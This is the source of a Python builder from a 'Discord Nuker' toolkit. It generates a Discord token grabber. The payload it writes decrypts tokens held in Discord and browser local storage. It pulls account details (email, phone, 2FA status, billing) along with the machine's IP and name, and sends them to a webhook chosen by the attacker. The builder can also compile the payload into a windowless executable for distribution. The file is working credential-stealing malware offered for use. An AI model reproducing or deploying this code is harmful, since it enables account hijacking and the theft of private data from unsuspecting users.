# Developper : waltta#6821 | https://github.com/waltta/LOG-YY-Nuker-Discord
# LOG-YY Discord Nuker / Multi Tool©
# Copyright © 2022 waltta#6821 
# Copyright © LOG-YY-Nuke
######################################################### 


import time, sys, os, shutil
from colorama import Fore

from utilities.Settings.common import *

def tokengrabber():
    setTitle("File Grabber")
    def spinner():
        l = ['|', '/', '-', '\\']
        for i in l+l:
            sys.stdout.write(f"""\r{y}[{b}*{y}]{w} Creating File... {i}""")
            sys.stdout.flush()
            time.sleep(0.2)
        print('\n')
        for i in l+l+l+l:
            sys.stdout.write(f"""\r{y}[{b}*{y}]{w} Writing File... {i}""")
            sys.stdout.flush()
            time.sleep(0.2)

    clear()
    filegrabbertitle()
    print(f"{y}[{w}#{y}]{w} Enter the name you want to give to the final file: ")
    global filename
    fileName = str(input(f"{y}[{b}-{y}]{w} File name: "))
    print(f"""\n\n{y}[{w}#{y}]{w} Enter A Vaild Webhook URL! (info gets sent to webhook!)""")
    global webhooklink
    webhooklink = str(input(f"{y}[{b}-{y}]{w} Webhook URL: "))
    print('\n')
    spinner()

    try:
        with open(f"{fileName}.py", "w") as file:
            file.write("""from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os
from datetime import datetime

tokens = []
cleaned = []
checker = []

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except: pass
    return ip
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\\n")[1]
def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\\\Google\\\\Chrome\\\\User Data"
    paths = {
        'Discord': roaming + '\\\\discord',
        'Discord Canary': roaming + '\\\\discordcanary',
        'Lightcord': roaming + '\\\\Lightcord',
        'Discord PTB': roaming + '\\\\discordptb',
        'Opera': roaming + '\\\\Opera Software\\\\Opera Stable',
        'Opera GX': roaming + '\\\\Opera Software\\\\Opera GX Stable',
        'Amigo': local + '\\\\Amigo\\\\User Data',
        'Torch': local + '\\\\Torch\\\\User Data',
        'Kometa': local + '\\\\Kometa\\\\User Data',
        'Orbitum': local + '\\\\Orbitum\\\\User Data',
        'CentBrowser': local + '\\\\CentBrowser\\\\User Data',
        '7Star': local + '\\\\7Star\\\\7Star\\\\User Data',
        'Sputnik': local + '\\\\Sputnik\\\\Sputnik\\\\User Data',
        'Vivaldi': local + '\\\\Vivaldi\\\\User Data\\\\Default',
        'Chrome SxS': local + '\\\\Google\\\\Chrome SxS\\\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\\\Epic Privacy Browser\\\\User Data',
        'Microsoft Edge': local + '\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul',
        'Uran': local + '\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default',
        'Yandex': local + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default',
        'Brave': local + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default',
        'Iridium': local + '\\\\Iridium\\\\User Data\\\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + f"\\\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: continue
        for file in listdir(path + f"\\\\Local Storage\\\\leveldb\\\\"):
            if not file.endswith(".ldb") and file.endswith(".log"): continue
            else:
                try:
                    with open(path + f"\\\\Local Storage\\\\leveldb\\\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\\"]*", x):
                                tokens.append(values)
                except PermissionError: continue
        for i in tokens:
            if i.endswith("\\\\"):
                i.replace("\\\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError == "Error": continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except: continue
                    if res.status_code == 200:
                        res_json = res.json()
                        ip = getip()
                        pc_username = os.getenv("UserName")
                        pc_name = os.getenv("COMPUTERNAME")
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)
                        embed = f\"""> **{user_name}**  |  *({user_id})*\n
> :gear: __Account Information:__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
> :computer: __PC Information:__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
> :warning: __Token:__\n\t`{tok}`\n
`{pc_username} Has Ran LOGYY-Nuker Token Grabber!` :smiling_imp:\"""
                        payload = json.dumps({'content': embed, 'username': 'LOGYY ManGrabber', 'avatar_url': 'https://media.discordapp.net/attachments/987095218920755232/1003976624175337492/LOG-YY-Nuker_ICON.png?width=646&height=646'})
                        try:
                            headers2 = {
                                'Content-Type': 'application/json',
                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                            }
                            req = Request('~~WEBHOOK_URL~~', data=payload.encode(), headers=headers2)
                            urlopen(req)
                        except: continue
                else: continue
if __name__ == '__main__':
    get_token()""".replace("~~WEBHOOK_URL~~", webhooklink))

    except Exception as e:
        print(f"""\n\n\n\n{y}[{Fore.LIGHTRED_EX }!{y}]{w}  Error Writing File: {e}""")
        os.system(2)
        clear()
        spammer()

    print(f"""\n\n\n{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} Correctly Written to "{fileName}.py" """)
    convert = input(f"""{y}[{b}#{y}]{w} Convert your script into an executable (Y/N)?: """)
    if convert.upper() == 'Y' or convert.upper() == 'YES':
        try:
            time.sleep(1)
            clear()

            print(f'{y}[{b}#{y}]{w} Compiling Files...')
            time.sleep(1)
            os.system(f"pyinstaller --onefile --noconsole --clean -i NONE {fileName}.py")
            clear()
            print(f'{y}[{b}#{y}]{w} Deleting Useless Files...')
            time.sleep(1)
            try:
                os.remove(f"{fileName}.spec")
                time.sleep(1)
            except:
                pass
            clear()
            filegrabbertitle()
            print(f"{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} Token Grabber has been successfully Created!")
        except:
            clear()
            filegrabbertitle()
            print(f"{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} Token Grabber has been successfully Created!")
            
        input(f"{y}[{b}#{y}]{w} Press ENTER: ")
    else:
        input(f"{y}[{b}#{y}]{w} Press ENTER: ")

tokengrabber()
